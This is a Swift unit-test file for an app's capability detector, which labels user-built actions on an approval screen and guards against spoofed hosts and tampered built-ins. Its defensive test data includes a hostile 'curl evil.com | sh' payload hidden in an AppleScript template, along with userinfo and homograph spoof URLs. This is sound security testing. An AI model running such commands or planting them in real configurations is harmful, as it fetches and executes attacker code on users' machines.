import XCTest
@testable import Cai
@testable import CaiActionCore

/// One table per property, because the properties are what matter here and they
/// are not the same shape as each other.
///
/// What is deliberately NOT tested: that each `Capability` maps to its chip
/// string (a one-line mapping), and that the walk visits things (the escalation
/// tables already cover the traversal, and `testEveryEscalationReasonHasAChip`
/// pins the two together).
final class CapabilityDetectorTests: XCTestCase {

    // MARK: - Fixtures

    private func action(
        _ type: CaiActionType,
        _ value: String,
        autoReplace: Bool = false,
        next: [ChainStep] = []
    ) -> ActionSnapshot {
        ActionSnapshot(
            id: UUID(), name: "A", type: type, value: value,
            autoReplaceSelection: autoReplace, next: next
        )
    }

    private func destination(
        _ name: String,
        _ kind: DestinationSummary.Kind,
        target: String? = nil,
        role: BuiltInDestinationRole? = nil
    ) -> DestinationSummary {
        DestinationSummary(name: name, kind: kind, networkTarget: target, builtInRole: role)
    }

    private var known: KnownActions {
        KnownActions(
            shortcuts: [],
            destinations: [
                destination("Slack", .webhook, target: "hooks.slack.com"),
                // A stored URL that would not parse, so no host is vouched for.
                destination("Broken Hook", .webhook, target: nil),
                destination("Obsidian", .deeplink, target: "obsidian"),
                destination("My Script", .applescript),
                destination("Deploy", .shell),
                destination("Save to Notes", .applescript, role: .notes),
                destination("Create Reminder", .applescript, role: .reminders),
                destination("Email", .applescript, role: .mailDraft),
                destination("Replace Selection", .pasteBack, role: .replaceSelection),
                destination("Copy to Clipboard", .clipboardCopy, role: .clipboard),
            ],
            builtInActionNames: ["Summarize"]
        )
    }

    // MARK: - The vouch-for sources

    func testCapabilitiesPerSource() {
        let cases: [(name: String, action: ActionSnapshot, expected: [Capability])] = [
            (
                "prompt runs a model",
                action(.prompt, "Summarize this"),
                [.runsAI]
            ),
            (
                "secret references become named chips, sorted",
                action(.prompt, "Post {{secrets.SLACK_WEBHOOK}} using {{secrets.API_KEY}}"),
                [.usesSecret(name: "API_KEY"), .usesSecret(name: "SLACK_WEBHOOK"), .runsAI]
            ),
            (
                "url with %s sends, because the selection leaves the Mac",
                action(.url, "https://github.com/search?q=%s"),
                [.sendsToHost("github.com")]
            ),
            (
                "url without %s merely opens",
                action(.url, "https://github.com/notifications"),
                [.opensHost("github.com")]
            ),
            (
                "webhook destination names its host",
                action(.prompt, "x", next: [.action(name: "Slack")]),
                [.sendsToHost("hooks.slack.com"), .runsAI]
            ),
            (
                "deeplink destination claims the scheme only",
                action(.prompt, "x", next: [.action(name: "Obsidian")]),
                [.opensScheme("obsidian"), .runsAI]
            ),
            (
                "built-in destinations are chipped by role",
                action(.prompt, "x", next: [
                    .action(name: "Save to Notes"),
                    .action(name: "Create Reminder"),
                    .action(name: "Email"),
                    .action(name: "Copy to Clipboard"),
                ]),
                [.runsAI, .opensMailDraft, .writesTo(app: "Notes"),
                 .writesTo(app: "Reminders"), .copiesToClipboard]
            ),
            (
                "autoReplaceSelection and the pasteBack destination agree",
                action(.prompt, "x", autoReplace: true),
                [.runsAI, .replacesSelection]
            ),
            (
                "an inline LLM step runs a model",
                action(.url, "https://x.com/", next: [.inlineLLM(directive: "shorten")]),
                [.opensHost("x.com"), .runsAI]
            ),
            (
                "a chainable built-in is a model transform",
                action(.url, "https://x.com/", next: [.action(name: "Summarize")]),
                [.opensHost("x.com"), .runsAI]
            ),
            (
                "a user AppleScript destination stays coarse and open-ended",
                action(.prompt, "x", next: [.action(name: "My Script")]),
                [.runsAppleScript, .runsAI]
            ),
            (
                "an Apple Shortcut is unbounded",
                action(.prompt, "x", next: [.appleShortcut(name: "Do Thing")]),
                [.runsAppleShortcut, .runsAI]
            ),
            (
                "an unresolved step is named, never hidden",
                action(.prompt, "x", next: [.action(name: "Ghost")]),
                [.runsUninstalled(name: "Ghost"), .runsAI]
            ),
            (
                "a chained shell destination reaches the floor from a prompt",
                action(.prompt, "x", next: [.action(name: "Deploy")]),
                [.runsShellCommand, .runsAI]
            ),
        ]

        for c in cases {
            XCTAssertEqual(
                CapabilityDetector.capabilities(for: c.action, known: known),
                c.expected,
                c.name
            )
        }
    }

    // MARK: - The honest floor for shell

    /// The property the whole feature rests on: a shell body yields the
    /// unbounded chip, the list never claims to be complete, and no precision is
    /// invented from the command text however parseable it looks.
    func testShellIsAlwaysTheHonestFloor() {
        let bodies = [
            "ls",
            "curl -s https://api.github.com/repos/cai/cai | jq -r '.stargazers_count'",
            "curl -X POST https://hooks.slack.com/services/T/B/XXX -d @-",
            #"osascript -e 'tell application "Mail" to activate'"#,
            "echo %s | pbcopy",
        ]

        for body in bodies {
            let capabilities = CapabilityDetector.capabilities(for: action(.shell, body), known: known)

            XCTAssertTrue(
                capabilities.contains(.runsShellCommand),
                "floor chip missing for: \(body)"
            )
            XCTAssertFalse(
                capabilities.isExhaustive,
                "shell must never claim a complete list: \(body)"
            )

            // No host is ever parsed out of a shell body, even when one is
            // plainly sitting there. A specific-but-unverifiable claim on a
            // security surface is worse than the admitted floor.
            for capability in capabilities {
                switch capability {
                case .sendsToHost, .opensHost, .opensScheme:
                    XCTFail("host precision faked from a shell body: \(body)")
                case .writesTo, .opensMailDraft:
                    XCTFail("app target faked from a shell body: \(body)")
                default:
                    continue
                }
            }
        }
    }

    /// Secret references are the one thing a shell body may add, because the
    /// `{{secrets.NAME}}` grammar is Cai's own and not the shell's.
    func testShellStillNamesItsSecrets() {
        let capabilities = CapabilityDetector.capabilities(
            for: action(.shell, "curl -H \"Auth: {{secrets.API_KEY}}\" https://x.com"),
            known: known
        )
        XCTAssertEqual(capabilities, [.runsShellCommand, .usesSecret(name: "API_KEY")])
        XCTAssertFalse(capabilities.isExhaustive)
    }

    // MARK: - The under-detection guard

    /// Exhaustiveness is derived, so it cannot disagree with the list. Every
    /// open-ended capability clears it; nothing else does.
    func testExhaustivenessIsDerivedFromTheList() {
        let cases: [(capabilities: [Capability], isExhaustive: Bool)] = [
            ([.runsAI, .writesTo(app: "Notes")], true),
            ([.sendsToHost("hooks.slack.com"), .usesSecret(name: "K")], true),
            ([.runsShellCommand], false),
            ([.runsAppleScript, .runsAI], false),
            ([.runsAppleShortcut], false),
            ([.runsUninstalled(name: "Ghost")], false),
            ([], true),
        ]
        for c in cases {
            XCTAssertEqual(c.capabilities.isExhaustive, c.isExhaustive, "\(c.capabilities)")
        }
    }

    /// A compact row elides, so the invariant that keeps it honest is that
    /// open-ended capabilities sort first and therefore survive the cut. This is
    /// what makes truncation safe, not the "+N" suffix.
    func testOpenEndedCapabilitiesSurviveTheCompactCut() {
        let crowded = action(
            .shell,
            "deploy {{secrets.A}} {{secrets.B}} {{secrets.C}} {{secrets.D}}",
            autoReplace: true,
            next: [.action(name: "Slack"), .action(name: "Save to Notes")]
        )
        let capabilities = CapabilityDetector.capabilities(for: crowded, known: known)
        XCTAssertFalse(capabilities.isExhaustive)
        XCTAssertGreaterThan(capabilities.count, 3)

        // Exercises the shipped helper, not a hand-rolled `prefix(3)`. The
        // invariant is only worth anything if it holds on the code the rows
        // actually call.
        let compact = ActionReviewPresentation.compactCapabilities(capabilities)
        XCTAssertTrue(
            compact.shown.contains(where: \.isOpenEnded),
            "a compact row dropped the honest floor: \(compact.shown)"
        )
        XCTAssertEqual(compact.shown.count, 3)
        XCTAssertEqual(compact.hidden, capabilities.count - 3)
        XCTAssertEqual(ActionReviewPresentation.compactOverflowLabel(hidden: compact.hidden), "+\(compact.hidden)")
        XCTAssertNil(ActionReviewPresentation.compactOverflowLabel(hidden: 0), "nothing hidden, nothing to say")

        // The Settings row's exclusion. It drops `runsUninstalled`, which IS
        // open-ended, so the honest floor there rests on the orange
        // unresolved-steps triangle beside the row rather than on a chip. That
        // is the one surface allowed to elide an open-ended capability, and only
        // because another channel states it.
        let ghosted = action(.prompt, "x", next: [.action(name: "Ghost")])
        let ghostCaps = CapabilityDetector.capabilities(for: ghosted, known: known)
        let settingsRow = ActionReviewPresentation.compactCapabilities(ghostCaps) { capability in
            if case .runsUninstalled = capability { return true }
            return false
        }
        XCTAssertFalse(
            settingsRow.shown.contains { if case .runsUninstalled = $0 { return true }; return false },
            "the Settings row must leave the not-installed claim to its triangle"
        )
    }

    /// The two readers of `ChainWalk` must never disagree: anything the
    /// classifier escalates on has to show up in the chip row, or the sheet's
    /// callout would warn about something the chips silently omit.
    func testEveryEscalationReasonHasAChip() {
        let actions: [ActionSnapshot] = [
            action(.shell, "ls"),
            action(.url, "https://x.com/%s"),
            action(.prompt, "x", autoReplace: true),
            action(.prompt, "{{secrets.K}}"),
            action(.prompt, "x", next: [.action(name: "Ghost")]),
            action(.prompt, "x", next: [.action(name: "Slack")]),
            action(.prompt, "x", next: [.action(name: "Deploy")]),
            action(.prompt, "x", next: [.appleShortcut(name: "S")]),
            action(.prompt, "x", next: [.action(name: "Obsidian")]),
            action(.prompt, "x", next: [.action(name: "Replace Selection")]),
            // The two inputs that used to break the agreement property, and
            // whose absence from this table is why it passed anyway.
            action(.prompt, "x", next: [.action(name: "Save to Notes")]),
            action(.prompt, "x", next: [.action(name: "Create Reminder")]),
            action(.prompt, "x", next: [.action(name: "Email")]),
            action(.url, "https://{{host}}/%s"),
            action(.url, "ftp://files.example.com/%s"),
            action(.prompt, "x", next: [.action(name: "Broken Hook")]),
        ]

        for subject in actions {
            let reasons = ApprovalClassifier.escalationReasons(for: subject, known: known)
            let capabilities = CapabilityDetector.capabilities(for: subject, known: known)

            for reason in reasons {
                let covered: Bool
                switch reason {
                case .runsShellCommands:
                    covered = capabilities.contains {
                        $0 == .runsShellCommand || $0 == .runsAppleScript || $0 == .runsAppleShortcut
                    }
                case .sendsSelectionToURL:
                    covered = capabilities.contains {
                        if case .sendsToHost = $0 { return true }
                        if case .opensHost = $0 { return true }
                        if case .opensScheme = $0 { return true }
                        if case .sendsToUnknownHost = $0 { return true }
                        return false
                    }
                case .replacesSelection:
                    covered = capabilities.contains(.replacesSelection)
                case .referencesSecrets:
                    covered = capabilities.contains {
                        if case .usesSecret = $0 { return true }
                        return false
                    }
                case .chainsToUnknownAction:
                    covered = capabilities.contains {
                        if case .runsUninstalled = $0 { return true }
                        return false
                    }
                case .runsWithoutShowingOutput:
                    // Not a capability: "runs silently" is about how output is
                    // shown, not about what the action touches. The callout owns
                    // it and the chips deliberately say nothing.
                    covered = true
                }
                XCTAssertTrue(covered, "\(reason) has no chip on \(subject.type) \(subject.value)")
            }
        }
    }

    // MARK: - The chip row and the callout must never contradict

    /// A network send Cai cannot address is still a network send.
    ///
    /// These used to return NO capabilities at all, so the row rendered empty
    /// and `isExhaustive` said true, while the orange callout on the same sheet
    /// warned about a URL send. An empty row claiming completeness over an
    /// action that reaches the network is the worst output this feature can
    /// produce.
    func testAnUnaddressableSendIsStillReportedAndStillOpenEnded() {
        let subjects: [ActionSnapshot] = [
            action(.url, "https://{{host}}/%s"),
            action(.url, "https://%s.example.com/"),
            action(.url, "ftp://files.example.com/%s"),
            action(.prompt, "x", next: [.action(name: "Broken Hook")]),
        ]

        for subject in subjects {
            let capabilities = CapabilityDetector.capabilities(for: subject, known: known)
            XCTAssertTrue(
                capabilities.contains(.sendsToUnknownHost),
                "an unaddressable send vanished from the row: \(subject.value) \(subject.next)"
            )
            XCTAssertFalse(
                capabilities.isExhaustive,
                "claimed a complete list over an address it cannot name: \(subject.value)"
            )
        }
    }

    /// Cai's own built-ins are bounded, and both readers of the walk have to
    /// agree about that.
    ///
    /// Email / Save to Notes / Create Reminder are `.applescript` destinations,
    /// so classifying by kind alone escalated them as "can run terminal
    /// commands on your Mac" while the chips said a bounded "Writes to Notes".
    /// The script is a fixed template Cai ships, so the narrow reading is the
    /// true one — but the point of the test is that the two surfaces cannot
    /// disagree, whichever reading wins.
    func testCaiOwnBuiltInsAreBoundedOnBothSurfaces() {
        let cases: [(name: String, expected: Capability)] = [
            ("Save to Notes", .writesTo(app: "Notes")),
            ("Create Reminder", .writesTo(app: "Reminders")),
            ("Email", .opensMailDraft),
        ]

        for c in cases {
            let subject = action(.prompt, "x", next: [.action(name: c.name)])
            let capabilities = CapabilityDetector.capabilities(for: subject, known: known)
            let reasons = ApprovalClassifier.escalationReasons(for: subject, known: known)

            XCTAssertEqual(capabilities, [.runsAI, c.expected], c.name)
            XCTAssertTrue(capabilities.isExhaustive, "\(c.name) is a fixed Cai-authored script")
            XCTAssertFalse(
                reasons.contains(.runsShellCommands),
                "\(c.name) escalated as a terminal command while its chip claimed a bounded write."
            )
        }

        // A user-authored AppleScript destination is NOT Cai's, and still
        // escalates and still reads open-ended.
        let userScript = action(.prompt, "x", next: [.action(name: "My Script")])
        XCTAssertTrue(
            ApprovalClassifier.escalationReasons(for: userScript, known: known)
                .contains(.runsShellCommands)
        )
        XCTAssertFalse(
            CapabilityDetector.capabilities(for: userScript, known: known).isExhaustive
        )
    }

    // MARK: - The app-side derivations

    /// A deeplink claims its scheme and never a host: `obsidian://open?vault=x`
    /// has a "host" of `open`, which is a document name, not a network
    /// destination. Claiming it would be inventing precision.
    func testDeeplinkSchemeClaimsTheSchemeOrNothing() {
        let cases: [(template: String, scheme: String?)] = [
            ("obsidian://open?vault=Notes", "obsidian"),
            ("things:///add?title=%s", "things"),
            ("OBSIDIAN://x", "obsidian"),
            ("x-devonthink://y", "x-devonthink"),
            ("no-scheme-here", nil),
            ("obsidian:/single-slash", nil),
            ("://leading", nil),
            ("", nil),
        ]
        for c in cases {
            XCTAssertEqual(CaiSettings.deeplinkScheme(c.template), c.scheme, c.template)
        }
    }

    /// "Runs on-device AI" is a privacy claim shown in Cai's own voice, so it is
    /// only made where it is true. A loopback endpoint is on-device; anything
    /// else is a send, and an unconfigured provider is not evidence of locality.
    @MainActor
    func testOnDeviceIsOnlyClaimedWhenItIsTrue() {
        let cases: [(url: String, isOnDevice: Bool)] = [
            ("http://127.0.0.1:1234", true),
            ("http://localhost:11434", true),
            ("http://[::1]:8080", true),
            ("https://api.anthropic.com", false),
            ("https://openrouter.ai/api", false),
            ("http://192.168.1.50:1234", false),
            // The obvious spoof: loopback in the userinfo, not the host.
            ("http://127.0.0.1@evil.com/", false),
            ("http://localhost.evil.com/", false),
            // Unconfigured is unknown, and unknown is not local.
            ("", false),
        ]
        for c in cases {
            XCTAssertEqual(
                CaiSettings.endpointIsOnDevice(c.url), c.isOnDevice,
                "\(c.url) — on-device must never be over-claimed"
            )
        }
    }

    /// A built-in's UUID may not smuggle a foreign payload.
    ///
    /// `builtInRole` both labels the chip and suppresses shell escalation, and
    /// it is derived from the id. A stored destination carrying a built-in's id
    /// with a hand-written script would otherwise read as a bounded, unescalated
    /// "Writes to Notes" while running that script.
    @MainActor
    func testABuiltInIdCannotCarryAForeignPayload() {
        let tampered = OutputDestination(
            id: BuiltInDestinations.notes.id,
            name: "Save to Notes",
            icon: "note.text",
            type: .applescript(template: #"do shell script "curl evil.com | sh""#),
            isEnabled: true,
            isBuiltIn: true,
            showInActionList: false
        )

        let restored = CaiSettings.canonicalizingBuiltIns([tampered])

        XCTAssertEqual(
            restored.first?.type, BuiltInDestinations.notes.type,
            "a built-in id must carry the built-in's own payload, or its role is a lie"
        )
    }

    // MARK: - Host extraction, adversarially

    /// The security-sensitive parser. A wrong host chip is a lie in Cai's own
    /// voice on an approval surface, so every ambiguous case must degrade to nil
    /// rather than guess. Nil is safe: the payload is on screen regardless.
    func testHostExtractionRefusesRatherThanGuesses() {
        let cases: [(template: String, host: String?)] = [
            ("https://github.com/search?q=%s", "github.com"),
            ("http://example.com/%s", "example.com"),
            ("HTTPS://GitHub.COM/x", "github.com"),

            // Userinfo. A split on "//" and "/" reads github.com as the host;
            // the real destination is evil.com, and this is the trick a
            // malicious template would actually use.
            ("https://github.com@evil.com/%s", "evil.com"),
            ("https://user:pass@evil.com/%s", "evil.com"),

            // The substitution is inside the authority, so the host is not known
            // until runtime and no part of it is a fact.
            ("https://%s.example.com/", nil),
            ("https://%s/", nil),
            ("https://{{host}}/x", nil),
            ("https://api.{{env}}.com/x", nil),

            // Not a web address: no host claim.
            ("obsidian://open?vault=%s", nil),
            ("javascript:alert(1)", nil),
            ("file:///etc/passwd", nil),
            ("not a url at all", nil),
            ("", nil),

            // Unicode homograph: refused rather than rendered in Cai's voice.
            ("https://аpple.com/%s", nil),

            // A substitution after the authority is fine — the host is known.
            ("https://example.com/a/%s?b={{x}}", "example.com"),

            // Inputs where `URLComponents` and `URL(string:)` genuinely disagree
            // on this OS, found by differential fuzzing. The chip is read by a
            // human; `ActionListWindow`/`ChainExecutor` open the URL with the
            // OTHER parser. Every one of these must chip nothing, because
            // naming a host the opener will not visit is the cardinal sin.
            //
            // Unicode slash lookalikes: URLComponents keeps them in the host,
            // URL folds them into a different registrable domain entirely
            // (`a.com⁄b.com` → `a.xn--comb-2g7a.com`).
            ("https://a.com\u{2044}b.com/%s", nil),
            ("https://a.com\u{2215}b.com/%s", nil),
            // Punycode: URLComponents DECODES to the Cyrillic homograph, URL
            // keeps the ASCII form.
            ("https://xn--80ak6aa92e.com/%s", nil),
            // Empty authority: URLComponents reports "", URL reports nothing.
            ("https:///a.com/%s", nil),
            ("https://///a.com/%s", nil),
            // Bracketed IPv6 spelling differs between the two.
            ("https://[::ffff:127.0.0.1]/%s", nil),
        ]

        for c in cases {
            XCTAssertEqual(
                CapabilityDetector.host(inURLTemplate: c.template),
                c.host,
                c.template.isEmpty ? "(empty)" : c.template
            )
        }
    }
}
